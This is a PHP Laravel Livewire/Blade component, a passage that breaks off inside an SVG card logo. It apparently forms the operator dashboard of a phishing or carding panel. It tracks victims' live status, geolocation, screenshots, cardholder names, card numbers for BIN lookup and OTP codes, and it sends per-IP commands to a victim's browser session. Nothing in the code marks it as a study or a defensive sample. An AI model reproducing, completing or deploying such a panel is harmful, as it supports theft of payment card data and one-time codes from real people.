<?php

use App\Models\User;
use Livewire\Attributes\Computed;
use Livewire\Attributes\On;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;
use App\Models\Customer;
use App\Models\Command;
use Illuminate\Support\Str;
use Illuminate\Support\Arr;
use Livewire\WithPagination;


use function Livewire\Volt\{computed, state, on, with, usesPagination, updated, hydrate};

usesPagination();

state([
    'role' => fn () => Auth::user()->role,
    'drawer' => false,
    'customer' => null,
    'notify' => false,
    'bins' => collect([]),
]);

$admin = computed(fn () => auth()->user()->role === 'admin');
$cmr = computed(fn () => $this->customer);
$customers = computed(fn () => Customer::where('user_id', auth()->user()->id)->orderBy('created_at', 'desc'));
$count = computed(fn () => $this->customers->count());

hydrate( function () {
    $this->dispatch('hydrated', newcustomers: $this->customers->get());
});

$deleteRecord = function ($id) {
    Customer::find($id)->delete();

};
$enableRecord = function ($id) {
    Customer::find($id)->update([
        'active' => true
    ]);
};
$disableRecord = function (Customer $customer) {
    $customer->update([
        'active' => false
    ]);
};

on(['bin-check-result' => function ($bin, $id) {
    $this->customer->update([
        'bin' => $bin,
    ]);
    $this->bins->push($bin);
}]);

$superDeleteRecord = function (Customer $customer) {
    $customer->forceDelete();
    $commit;
};

$markAsUnread = function (Customer $customer) {
    $customer->screenshots()->delete();
    $customer->seen = false;
    $customer->news = true;
    $customer->live = 'Clientul introduce nr. de inmatriculare';
    $customer->otp = null;
    $customer->updated_at = $customer->created_at;
    $customer->save();
};

$openDrawer = function (Customer $customer) {
    $customer->seen = true;
    $customer->news = false;
    $customer->save();
    $this->customer = $customer;
    $this->drawer = true;
    $this->notify = true;
    $this->dispatch('mute-customer', cmr: $customer->toJson(), id: $customer->id);
};

$sendCommand = function ($command, $ip) {
    $comm = Command::where('ip', $ip)->where('user_id', auth()->user()->id);

    if($comm->count()) {
        $comm->update([
            'command' => $command,
        ]);
    } else {
        $comm->create([
            'ip' => $ip,
            'command' => $command,
            'user_id' => auth()->user()->id,
        ]);
    }
    $this->dispatch('log', $comm);
};

$binCheck = function ($number, $id) {
    // remove spaces from number
    $number = str()->replaceMatches(
        pattern: '/[^0-9]++/',
        replace: '',
        subject: $number
    );
    $this->dispatch('bin-check', ccnum: $number, id: $id);
};
?>
<section wire:poll.keep-alive>
    @if(app('impersonate')->isImpersonating())
    <div class="py-3 mb-5 flex items-center text-sm text-gray-800 before:flex-1 before:border-t before:border-gray-200 before:me-6 after:flex-1 after:border-t after:border-gray-200 after:ms-6 dark:text-white dark:before:border-neutral-600 dark:after:border-neutral-600">Current browser sessions</div>
    <table class="w-full text-sm text-left text-gray-500 dark:text-gray-400">
        <thead class="text-xs text-gray-700  bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
            <tr>
                <th scope="col" class="w-5 ps-3 py-3">#</th>
                <th scope="col" class="py-3">
                    Browser
                </th>
                <th scope="col" class="py-3">
                    Device
                </th>
                <th scope="col" class="py-3">
                    OS
                </th>
                <th scope="col" class="py-3">
                    IP
                </th>
                <th scope="col" class="py-3">
                    Current device
                </th>
                <th scope="col" class="py-3">
                    Last active
                </th>
            </tr>
        </thead>
        <tbody>
            @foreach (BrowserSessions::sessions() as $key => $session)
            <tr class="bg-white border-b dark:bg-gray-800 dark:border-gray-700" key="{{ $key }}">
                <th class="w-5 ps-3 py-3">
                    {{ $key + 1 }}
                </th>
                <th class="py-3">
                    {{ $session->device['browser'] ?? 'Unknown' }}
                </th>
                <th class="py-3">
                    {{ $session->device['desktop'] ? 'Desktop' : 'Mobile' }}
                </th>
                <th class="py-3">
                    {{ $session->device['platform'] ?? 'Unknown' }}
                </th>
                <th class="py-3">
                    {{ $session->ip_address ?? 'Unknown' }}
                </th>
                <th class="py-3">
                    {{ $session->is_current_device ? 'Yes' : 'No' }}
                </th>
                <th class="py-3">
                    {{ $session->last_active ?? 'Unknown' }}
                </th>
            </tr>
            @endforeach
        </tbody>
    </table>
    @endif
    @if($this->customers->count() > 0)
    <table class="w-full text-sm text-left text-gray-500 dark:text-gray-400">
        <thead class="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
            <tr>
                <th scope="col" class="w-5 px-3 py-3">#</th>
                <th scope="col" class="px-6 py-3"></th>
                <th scope="col" class="py-3">
                    Live
                </th>
                <th scope="col" class="py-3">
                    Details
                </th>
                <th scope="col" class="py-3">
                    Date
                </th>
                <th scope="col" class="px-6 py-3 text-right">
                    Actions
                </th>
            </tr>
        </thead>
        <tbody>
            @foreach ($this->customers->get() as $key => $customer)
                <tr class="bg-white border-b dark:bg-gray-800 dark:border-gray-700 @if(!$customer->active) opacity-10 @endif" key="{{ $key }}">
                    <th class="py-2 mx-2 px-2" id="{{ $customer->id }}">
                        @if($customer->news === true && $customer->seen === false)
                            <x-bi-circle-fill class="w-5 h-5 text-green-800 animate-pulse"/>
                        @elseif($customer->news === true && $customer->seen === true)
                            <x-bi-circle-fill class="w-5 h-5 text-orange-600 animate-pulse"/>
                        @else
                            <x-bi-circle-fill class="w-5 h-5 text-gray-300 opacity-25"/>
                        @endif
                    </th>
                    <th scope="row" class="py-2 text-gray-900 whitespace-nowrap dark:text-white">
                        <a class="underline" href="#" wire:click.prevent="openDrawer({{ $customer->id }})">
                            @if($customer->news === true && $customer->seen === 0)
                                <strong class="font-medium">{{ $customer->id }}</strong>
                            @else
                                <em class="font-light">{{ $customer->id }}</em>
                            @endif
                        </a>
                    </th>
                    <td class="py-2 ">
                        <a class="" href="#" wire:click.prevent="openDrawer({{ $customer->id }})">
                        @if($customer->news === true && $customer->seen === 0)
                            <strong class="text-pink-300 underline">{{ $customer->live }}</strong>
                        @else
                            <em class="text-blue-300 underline">{{ $customer->live }}</em>
                        @endif
                        </a>
                    </td>
                    <td class="py-1">

                        @if($customer->news && !$customer->seen)
                            <strong class="block">{{ $customer->data['machine'] }}</strong>
                            <em>{{ $customer->data['city'] }}, {{ $customer->data['region'] }}, {{ $customer->data['country'] }}</em>
                        @else
                            <em class="block">{{ $customer->data['machine'] }}</em>
                            <em>{{ $customer->data['city'] }}, {{ $customer->data['region'] }}, {{ $customer->data['country'] }}</em>
                        @endif
                    </td>

                    <td class="py-2">
                        @if($customer->news && !$customer->seen)
                            <strong class="block">{{ $customer->created_at->diffForHumans() }}</strong>
                        @else
                            <em class="block">{{ $customer->updated_at->diffForHumans() }}</em>
                            <em>{{ $customer->created_at->diffForHumans() }} created</em>
                        @endif
                    </td>
                    <td class="py-2 text-right">
                        <x-mary-button class="btn-square btn-sm btn-ghost btn-error" wire:click.prevent="deleteRecord({{ $customer->id }})" icon="bi.trash3" wire:confirm="Are you sure you want to delete this customer? This action cannot be undone." spinner></x-mary-button>

                        @if($customer->active)
                            <x-mary-button class="btn-square btn-sm btn-ghost btn-error" wire:click.prevent="disableRecord({{ $customer->id }})" icon="bi.eye-slash" spinner ></x-mary-button>
                        @else
                            <x-mary-button class="btn-square btn-sm btn-ghost btn-error" wire:click.prevent="enableRecord({{ $customer->id }})" icon="bi.eye" spinner ></x-mary-button>
                        @endif

                        @if(app('impersonate')->isImpersonating())
                            @if($customer->news && !$customer->seen)
                            <x-mary-button disabled class="btn-square btn-sm btn-ghost btn-error" wire:click.prevent="markAsUnread({{ $customer->id }})" icon="bi.star-fill" spinner></x-mary-button>
                            @else
                            <x-mary-button class="btn-square btn-sm btn-ghost btn-error" wire:click.prevent="markAsUnread({{ $customer->id }})" icon="bi.star-fill" spinner></x-mary-button>
                            @endif

                            <x-mary-button class="btn-square btn-sm btn-ghost btn-error text-red-500" wire:click.prevent="superDeleteRecord({{ $customer->id }})" wire:confirm="Are you sure you want to delete this customer? This action cannot be undone." icon="bi.trash3" spinner></x-mary-button>
                        @else
                            <x-mary-button class="btn-square btn-sm btn-ghost" wire:click.prevent="openDrawer({{ $customer->id }})" icon="carbon.side-panel-close-filled" spinner></x-mary-button>
                        @endif



                    </td>
                </tr>
            @endforeach
        </tbody>
    </table>
    @else
        <p class="w-full text-center py-10">
            No clients yet.
        </p>
    @endif


    <x-mary-drawer
        wire:model="drawer"
        class="w-9/10 lg:w-4/5 custom-drawer"
        title="Live customer view"
        subtitle="customer #{{ $this->cmr->id ?? '' }} with ip {{ $this->cmr->data['ip'] ?? '' }}"
        right
        with-close-button
    >
        <div class="w-full">
            <div>

            </div>
            <table class="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400 mb-5">
                <thead class="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
                    <tr>
                        <th scope="col" class="px-6 py-3 w-1/2">
                            CARD
                        </th>
                        <th scope="col" class="px-6 py-3 w-1/2">
                            Screenshot
                        </th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td class="py-3">
                            <div class="relative mb-5 h-48 w-80 rounded-xl bg-gradient-to-r from-orange-500 to-red-500 text-white shadow-2xl transition-transform sm:h-56 sm:w-96 sm:hover:scale-105">
                                <div class="absolute top-4 w-full px-8 sm:top-8">
                                  <div class="flex justify-between">
                                    <div class="">
                                      <p class="font-light text-xs text-gray-600">Cardholder name</p>
                                      <p class="font-medium tracking-widest">{{ $this->cmr->cardholder ?? 'J**** D***' }}</p>
                                    </div>
                                    @if(isset($this->cmr->ccname) && $this->cmr->ccname != null)
                                        @switch($this->cmr->ccname)
                                            @case("Mastercard")
                                                <svg width="64px" height="64px" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g fill="none" fill-rule="evenodd"> <circle cx="7" cy="12" r="7" fill="#EA001B"></circle> <circle cx="17" cy="12" r="7" fill="#FFA200" fill-opacity=".8"></circle> </g> </g></svg>
                                                @break
                                            @case("Amex")
                                                <svg width="64px" height="64px" viewBox="0 -140 780 780" enable-background="new 0 0 780 500" version="1.1" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="m575.61 145.11l-15.092 35.039h30.266l-15.174-35.039zm-174.15 21.713c2.845-1.422 4.52-4.515 4.52-8.356 0-3.764-1.76-6.49-4.604-7.771-2.591-1.42-6.577-1.584-10.399-1.584h-27v19.523h26.638c4.266 1e-3 7.831-0.059 10.845-1.812zm-345.97-21.713l-14.921 35.039h29.932l-15.011-35.039zm694.7 224.47h-42.344v-18.852h42.173c4.181 0 7.109-0.525 8.872-2.178 1.667-1.473 2.609-3.555 2.592-5.732 0-2.562-1.062-4.596-2.68-5.813-1.588-1.342-3.907-1.953-7.726-1.953-20.588-0.67-46.273 0.609-46.273-27.211 0-12.75 8.451-26.172 31.461-26.172h43.677v-17.492h-40.58c-12.246 0-21.144 2.81-27.443 7.181v-7.181h-60.022c-9.597 0-20.863 2.279-26.191 7.181v-7.181h-107.19v7.181c-8.529-5.897-22.925-7.181-29.565-7.181h-70.702v7.181c-6.747-6.262-21.758-7.181-30.902-7.181h-79.127l-18.104 18.775-16.959-18.775h-118.2v122.68h115.97l18.655-19.076 17.575 19.076 71.484 0.06v-28.859h7.03c9.484 0.146 20.67-0.223 30.542-4.311v33.106h58.962v-31.976h2.844c3.628 0 3.988 0.146 3.988 3.621v28.348h179.12c11.372 0 23.26-2.786 29.841-7.853v7.853h56.817c11.822 0 23.369-1.588 32.154-5.653v-22.853c-5.324 7.462-15.707 11.245-29.751 11.245zm-363.58-28.967h-27.36v29.488h-42.618l-27-29.102-28.058 29.102h-86.854v-87.914h88.19l26.976 28.818 27.89-28.818h70.064c17.401 0 36.952 4.617 36.952 28.963 0 24.422-19.016 29.463-38.182 29.463zm131.56-3.986c3.097 4.291 3.544 8.297 3.634 16.047v17.428h-22.016v-10.998c0-5.289 0.533-13.121-3.544-17.209-3.2-3.148-8.086-3.9-16.088-3.9h-23.432v32.107h-22.031v-87.914h50.62c11.105 0 19.188 0.473 26.384 4.148 6.92 4.006 11.275 9.494 11.275 19.523-2e-3 14.031-9.769 21.189-15.541 23.389 4.878 1.725 8.866 4.818 10.739 7.379zm90.575-36.258h-51.346v15.982h50.091v17.938h-50.091v17.492l51.346 0.078v18.242h-73.182v-87.914h73.182v18.182zm56.344 69.731h-42.705v-18.852h42.535c4.16 0 7.109-0.527 8.957-2.178 1.507-1.359 2.591-3.336 2.591-5.73 0-2.564-1.174-4.598-2.676-5.818-1.678-1.34-3.993-1.947-7.809-1.947-20.506-0.674-46.186 0.605-46.186-27.213 0-12.752 8.363-26.174 31.35-26.174h43.96v18.709h-40.225c-3.987 0-6.579 0.146-8.783 1.592-2.405 1.424-3.295 3.535-3.295 6.322 0 3.316 2.04 5.574 4.797 6.549 2.314 0.771 4.797 0.996 8.533 0.996l11.805 0.309c11.899 0.273 20.073 2.25 25.04 7.068 4.266 4.232 6.559 9.578 6.559 18.625-2e-3 18.913-12.335 27.742-34.448 27.742zm-170.06-68.313c-2.649-1.508-6.559-1.588-10.461-1.588h-27.001v19.744h26.64c4.265 0 7.892-0.145 10.822-1.812 2.842-1.646 4.543-4.678 4.543-8.438s-1.701-6.482-4.543-7.906zm244.99-1.59c-3.988 0-6.641 0.145-8.873 1.588-2.314 1.426-3.202 3.537-3.202 6.326 0 3.314 1.953 5.572 4.794 6.549 2.315 0.771 4.796 0.996 8.448 0.996l11.887 0.303c11.99 0.285 19.998 2.262 24.879 7.08 0.889 0.668 1.423 1.42 2.034 2.174v-25.014h-39.965l-2e-3 -2e-3zm-352.65 0h-28.59v22.391h28.336c8.424 0 13.663-4.006 13.667-11.611-4e-3 -7.688-5.497-10.78-13.413-10.78zm-190.81 0v15.984h48.136v17.938h-48.136v17.49h53.909l25.047-25.791-23.983-25.621h-54.973zm140.77 61.479v-70.482l-33.664 34.674 33.664 35.808zm-138.93-141.15v15.148h183.19l-0.085-32.046h3.545c2.483 0.083 3.205 0.302 3.205 4.229v27.818h94.748v-7.461c7.642 3.924 19.527 7.461 35.168 7.461h39.86l8.531-19.522h18.913l8.342 19.522h76.811v-18.544l11.629 18.543h61.555v-122.58h-60.915v14.477l-8.53-14.477h-62.507v14.477l-7.833-14.477h-84.434c-14.135 0-26.555 1.89-36.591 7.158v-7.158h-58.268v7.158c-6.387-5.43-15.089-7.158-24.762-7.158h-212.87l-14.282 31.662-14.668-31.662h-67.047v14.477l-7.367-14.477h-57.18l-26.553 58.284v46.621l39.264-87.894h32.579l37.29 83.217v-83.217h35.789l28.695 59.625 26.362-59.625h36.507v87.894h-22.475l-0.082-68.837-31.796 68.837h-19.252l-31.877-68.898v68.898h-44.6l-8.425-19.605h-45.654l-8.512 19.605h-23.814v17.682h37.466l8.447-19.523h18.914l8.425 19.523h73.713v-14.927l6.579 14.989h38.266l6.58-15.214zm288.67-80.176c7.085-7.015 18.188-10.25 33.298-10.25h21.227v18.833h-20.782c-7.998 0-12.521 1.14-16.871 5.208-3.74 3.7-6.304 10.696-6.304 19.908 0 9.417 1.955 16.206 6.028 20.641 3.376 3.478 9.513 4.533 15.283 4.533h9.851l30.902-69.12h32.853l37.124 83.134v-83.133h33.386l38.543 61.213v-61.213h22.46v87.891h-31.072l-41.562-65.968v65.968h-44.656l-8.532-19.605h-45.55l-8.278 19.605h-25.66c-10.657 0-24.151-2.258-31.793-9.722-7.707-7.462-11.713-17.571-11.713-33.553-4e-3 -13.037 2.389-24.953 11.818-34.37zm-45.101-10.249h22.372v87.894h-22.372v-87.894zm-100.87 0h50.432c11.203 0 19.464 0.285 26.553 4.21 6.936 3.926 11.095 9.658 11.095 19.46 0 14.015-9.763 21.254-15.448 23.429 4.796 1.75 8.896 4.841 10.849 7.401 3.096 4.372 3.629 8.277 3.629 16.126v17.267h-22.115l-0.083-11.084c0-5.29 0.528-12.896-3.461-17.122-3.203-3.09-8.088-3.763-15.983-3.763h-23.538v31.97h-21.927l-3e-3 -87.894zm-88.393 0h73.249v18.303h-51.32v15.843h50.088v18.017h-50.088v17.553h51.32v18.177h-73.249v-87.893z" fill="#2557D6"></path></g></svg>
                                                @break
                                            @case("Diners")
                                                <svg version="1.1" id="Layer_1" xmlns:sketch="http://www.bohemiancoding.com/sketch/ns" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="64px" height="64px" viewBox="0 0 750 471" enable-background="new 0 0 750 471" xml:space="preserve" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title>diners</title> <desc>Created with Sketch.</desc> <g id="diners" sketch:type="MSLayerGroup"> <path id="Shape-path" sketch:type="MSShapeGroup" fill="#0079BE" d="M584.934,236.947c0-99.416-82.98-168.133-173.896-168.1 h-78.241c-92.003-0.033-167.73,68.705-167.73,168.1c0,90.931,75.729,165.641,167.73,165.203h78.241 C501.951,402.587,584.934,327.857,584.934,236.947L584.934,236.947z"></path> <path id="Shape-path_1_" sketch:type="MSShapeGroup" fill="#FFFFFF" d="M333.281,82.932 c-84.069,0.026-152.193,68.308-152.215,152.58c0.021,84.258,68.145,152.532,152.215,152.559 c84.088-0.026,152.229-68.301,152.239-152.559C485.508,151.238,417.369,82.958,333.281,82.932L333.281,82.932z"></path> <path id="Path" sketch:type="MSShapeGroup" fill="#0079BE" d="M237.066,235.098c0.08-41.18,25.747-76.296,61.94-90.25v180.479 C262.813,311.381,237.145,276.283,237.066,235.098z M368.066,325.373V144.848c36.208,13.921,61.915,49.057,61.981,90.256 C429.981,276.316,404.274,311.426,368.066,325.373z"></path> </g> </g></svg>
                                                @break
                                            @case("JCB")
                                                <svg version="1.1" id="Layer_1" xmlns:sketch="http://www.bohemiancoding.com/sketch/ns" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="64px" height="64px" viewBox="0 0 750 471" enable-background="new 0 0 750 471" xml:space="preserve" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title>Slice 1</title> <desc>Created with Sketch.</desc> <g> <path id="path3494" sketch:type="MSShapeGroup" fill="#FFFFFF" d="M617.242,346.766c0,41.615-33.729,75.36-75.357,75.36H132.759 V124.245c0-41.626,33.73-75.371,75.364-75.371h409.12V346.766L617.242,346.766L617.242,346.766z"></path> <linearGradient id="path3496_1_" gradientUnits="userSpaceOnUse" x1="824.7424" y1="333.7813" x2="825.7424" y2="333.7813" gradientTransform="matrix(132.8743 0 0 -323.0226 -109129.5313 108054.6016)"> <stop offset="0" style="stop-color:#007B40"></stop> <stop offset="1" style="stop-color:#55B330"></stop> </linearGradient> <path id="path3496" sketch:type="MSShapeGroup" fill="url(#path3496_1_)" d="M483.86,242.045c11.686,0.254,23.439-0.516,35.078,0.4 c11.787,2.199,14.627,20.043,4.156,25.887c-7.145,3.85-15.633,1.434-23.379,2.113H483.86V242.045L483.86,242.045z M525.694,209.9 c2.596,9.164-6.238,17.392-15.064,16.13h-26.77c0.188-8.642-0.367-18.022,0.273-26.209c10.723,0.302,21.547-0.616,32.209,0.48 C520.922,201.452,524.756,205.218,525.694,209.9L525.694,209.9z M590.119,73.997c0.498,17.501,0.072,35.927,0.215,53.783 c-0.033,72.596,0.07,145.195-0.057,217.789c-0.469,27.207-24.582,50.847-51.6,51.39c-27.045,0.11-54.094,0.017-81.143,0.047 v-109.75c29.471-0.153,58.957,0.308,88.416-0.231c13.666-0.858,28.635-9.875,29.271-24.914 c1.609-15.103-12.631-25.551-26.152-27.201c-5.197-0.135-5.045-1.515,0-2.117c12.895-2.787,23.021-16.133,19.227-29.499 c-3.234-14.058-18.771-19.499-31.695-19.472c-26.352-0.179-52.709-0.025-79.063-0.077c0.17-20.489-0.355-41,0.283-61.474 c2.088-26.716,26.807-48.748,53.447-48.27C537.555,73.998,563.838,73.998,590.119,73.997L590.119,73.997z"></path> <linearGradient id="path3498_1_" gradientUnits="userSpaceOnUse" x1="824.7551" y1="333.7822" x2="825.7484" y2="333.7822" gradientTransform="matrix(133.4307 0 0 -323.0203 -109887.6875 108053.8203)"> <stop offset="0" style="stop-color:#1D2970"></stop> <stop offset="1" style="stop-color:#006DBA"></stop> </linearGradient> <path id="path3498" sketch:type="MSShapeGroup" fill="url(#path3498_1_)" d="M159.742,125.041 c0.673-27.164,24.888-50.611,51.872-51.008c26.945-0.083,53.894-0.012,80.839-0.036c-0.074,90.885,0.146,181.776-0.111,272.657 c-1.038,26.834-24.989,49.834-51.679,50.309c-26.996,0.098-53.995,0.014-80.992,0.041V283.551 c26.223,6.195,53.722,8.832,80.474,4.723c15.991-2.574,33.487-10.426,38.901-27.016c3.984-14.191,1.741-29.126,2.334-43.691 v-33.825h-46.297c-0.208,22.371,0.426,44.781-0.335,67.125c-1.248,13.734-14.849,22.46-27.802,21.994 c-16.064,0.17-47.897-11.641-47.897-11.641C158.969,219.305,159.515,166.814,159.742,125.041L159.742,125.041z"></path> <linearGradient id="path3500_1_" gradientUnits="userSpaceOnUse" x1="824.7424" y1="333.7813" x2="825.741" y2="333.7813" gradientTransform="matrix(132.9583 0 0 -323.0276 -109347.9219 108056.2656)"> <stop offset="0" style="stop-color:#6E2B2F"></stop> <stop offset="1" style="stop-color:#E30138"></stop> </linearGradient> <path id="path3500" sketch:type="MSShapeGroup" fill="url(#path3500_1_)" d="M309.721,197.39 c-2.437,0.517-0.491-8.301-1.114-11.646c0.166-21.15-0.346-42.323,0.284-63.458c2.082-26.829,26.991-48.916,53.738-48.288h78.767 c-0.074,90.885,0.145,181.775-0.111,272.657c-1.039,26.834-24.992,49.833-51.682,50.309c-26.998,0.101-53.998,0.015-80.997,0.042 V272.707c18.44,15.129,43.5,17.484,66.472,17.525c17.318-0.006,34.535-2.676,51.353-6.67V260.79 c-18.953,9.446-41.234,15.446-62.244,10.019c-14.656-3.649-25.294-17.813-25.057-32.937c-1.698-15.729,7.522-32.335,22.979-37.011 c19.192-6.008,40.108-1.413,58.096,6.398c3.855,2.018,7.766,4.521,6.225-1.921v-17.899c-30.086-7.158-62.104-9.792-92.33-2.005 C325.352,187.902,316.828,191.645,309.721,197.39L309.721,197.39z"></path> </g> </g></svg>
                                                @break
                                            @case("Discover")
                                                <svg version="1.1" id="Layer_1" xmlns:sketch="http://www.bohemiancoding.com/sketch/ns" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="64px" height="64px" viewBox="0 0 780 501" enable-background="new 0 0 780 501" xml:space="preserve" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title>discover</title> <desc>Created with Sketch.</desc> <g id="Page-1" sketch:type="MSPage"> <g id="discover" sketch:type="MSLayerGroup"> <path fill="#F47216" d="M409.412,197.758c30.938,0,56.02,23.58,56.02,52.709v0.033c0,29.129-25.082,52.742-56.02,52.742 c-30.941,0-56.022-23.613-56.022-52.742v-0.033C353.39,221.338,378.471,197.758,409.412,197.758L409.412,197.758z"></path> <path d="M321.433,198.438c8.836,0,16.247,1.785,25.269,6.09v22.752c-8.544-7.863-15.955-11.154-25.757-11.154 c-19.265,0-34.413,15.015-34.413,34.051c0,20.074,14.681,34.195,35.368,34.195c9.313,0,16.586-3.12,24.802-10.856v22.764 c-9.343,4.141-16.912,5.775-25.757,5.775c-31.277,0-55.581-22.597-55.581-51.737C265.363,221.49,290.314,198.438,321.433,198.438 L321.433,198.438z"></path> <path d="M224.32,199.064c11.546,0,22.109,3.721,30.942,10.994l-10.748,13.248c-5.351-5.646-10.411-8.027-16.563-8.027 c-8.854,0-15.301,4.745-15.301,10.988c0,5.354,3.618,8.188,15.944,12.482c23.364,8.043,30.289,15.176,30.289,30.926 c0,19.193-14.976,32.554-36.319,32.554c-15.631,0-26.993-5.795-36.457-18.871l13.268-12.031 c4.73,8.609,12.622,13.223,22.42,13.223c9.163,0,15.947-5.951,15.947-13.984c0-4.164-2.056-7.733-6.158-10.258 c-2.066-1.195-6.158-2.977-14.199-5.646c-19.292-6.538-25.91-13.527-25.91-27.186C191.474,211.25,205.688,199.064,224.32,199.064 L224.32,199.064z"></path> <polygon points="459.043,200.793 481.479,200.793 509.563,267.385 538.01,200.793 560.276,200.793 514.783,302.479 503.729,302.479 "></polygon> <polygon points="157.83,200.945 178.371,200.945 178.371,300.088 157.83,300.088 "></polygon> <polygon points="569.563,200.945 627.815,200.945 627.815,217.744 590.09,217.744 590.09,239.75 626.426,239.75 626.426,256.541 590.09,256.541 590.09,283.303 627.815,283.303 627.815,300.088 569.563,300.088 "></polygon> <path d="M685.156,258.322c15.471-2.965,23.984-12.926,23.984-28.105c0-18.562-13.576-29.271-37.266-29.271H641.42v99.143h20.516 V260.26h2.68l28.43,39.828h25.26L685.156,258.322z M667.938,246.586h-6.002v-30.025h6.326c12.791,0,19.744,5.049,19.744,14.697 C688.008,241.224,681.055,246.586,667.938,246.586z"></path> <path d="M91.845,200.945H61.696v99.143h29.992c15.946,0,27.465-3.543,37.573-11.445c12.014-9.36,19.117-23.467,19.117-38.057 C148.379,221.327,125.157,200.945,91.845,200.945z M115.842,275.424c-6.454,5.484-14.837,7.879-28.108,7.879H82.22v-65.559h5.513 c13.271,0,21.323,2.238,28.108,8.018c7.104,5.956,11.377,15.183,11.377,24.682C127.219,259.957,122.945,269.468,115.842,275.424z"></path> </g> </g> </g></svg>
                                                @break
                                            @case("Visa")
                                                <svg width="64px" height="64px" viewBox="0 -140 780 780" enable-background="new 0 0 780 500" version="1.1" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="m293.2 348.73l33.359-195.76h53.358l-33.384 195.76h-53.333zm246.11-191.54c-10.569-3.966-27.135-8.222-47.821-8.222-52.726 0-89.863 26.551-90.181 64.604-0.297 28.129 26.515 43.822 46.754 53.185 20.771 9.598 27.752 15.716 27.652 24.283-0.133 13.123-16.586 19.115-31.924 19.115-21.355 0-32.701-2.967-50.225-10.273l-6.878-3.111-7.487 43.822c12.463 5.467 35.508 10.199 59.438 10.445 56.09 0 92.502-26.248 92.916-66.885 0.199-22.27-14.016-39.215-44.801-53.188-18.65-9.056-30.072-15.099-29.951-24.269 0-8.137 9.668-16.838 30.56-16.838 17.446-0.271 30.088 3.534 39.936 7.5l4.781 2.259 7.231-42.427m137.31-4.223h-41.23c-12.772 0-22.332 3.486-27.94 16.234l-79.245 179.4h56.031s9.159-24.121 11.231-29.418c6.123 0 60.555 0.084 68.336 0.084 1.596 6.854 6.492 29.334 6.492 29.334h49.512l-43.187-195.64zm-65.417 126.41c4.414-11.279 21.26-54.724 21.26-54.724-0.314 0.521 4.381-11.334 7.074-18.684l3.606 16.878s10.217 46.729 12.353 56.527h-44.293v3e-3zm-363.3-126.41l-52.239 133.5-5.565-27.129c-9.726-31.274-40.025-65.157-73.898-82.12l47.767 171.2 56.455-0.063 84.004-195.39-56.524-1e-3" fill="#0E4595"></path><path d="m146.92 152.96h-86.041l-0.682 4.073c66.939 16.204 111.23 55.363 129.62 102.42l-18.709-89.96c-3.229-12.396-12.597-16.096-24.186-16.528" fill="#F2AE14"></path></g></svg>
                                                @break
                                            @default
                                                <svg version="1.1" id="Layer_1" xmlns:sketch="http://www.bohemiancoding.com/sketch/ns" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="64px" height="64px" viewBox="0 0 750 471" enable-background="new 0 0 750 471" xml:space="preserve" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <title>Slice 1</title> <desc>Created with Sketch.</desc> <g id="Page-1" sketch:type="MSPage"> <g id="maestro" sketch:type="MSLayerGroup"> <path id="Fill-1" sketch:type="MSShapeGroup" fill="#D9222A" d="M675,235.506c0,99.133-80.351,179.496-179.483,179.496 c-99.121,0-179.479-80.362-179.479-179.496c0-99.142,80.358-179.508,179.479-179.508C594.65,55.998,675,136.365,675,235.506"></path> <path id="Fill-2" sketch:type="MSShapeGroup" fill="#0097D0" d="M356.87,349.49c-4.958-6.014-9.524-12.359-13.675-19.009h63.612 c3.817-6.097,7.263-12.442,10.342-19.013h-84.292c-2.87-6.15-5.425-12.492-7.596-19h99.476c5.987-17.904,9.229-37.05,9.229-56.962 c0-13.046-1.392-25.763-4.028-38.013H320.074c1.392-6.479,3.142-12.816,5.209-19.008h99.441 c-2.184-6.508-4.721-12.85-7.592-19.004h-84.254c3.075-6.563,6.529-12.904,10.337-19.009h63.571 c-4.146-6.629-8.725-12.975-13.671-18.991h-36.225c5.57-6.767,11.629-13.117,18.112-19 c-31.854-28.884-74.138-46.483-120.517-46.483C155.359,55.998,75,136.365,75,235.506c0,99.133,80.358,179.496,179.487,179.496 c46.388,0,88.666-17.596,120.517-46.475c6.496-5.893,12.559-12.259,18.133-19.037H356.87"></path> <path id="Fill-3" sketch:type="MSShapeGroup" d="M651.074,335.544c0-3.2,2.596-5.796,5.801-5.796c3.199,0,5.791,2.596,5.791,5.796 c0,3.204-2.592,5.8-5.791,5.8C653.67,341.344,651.074,338.748,651.074,335.544L651.074,335.544L651.074,335.544z M656.875,339.952 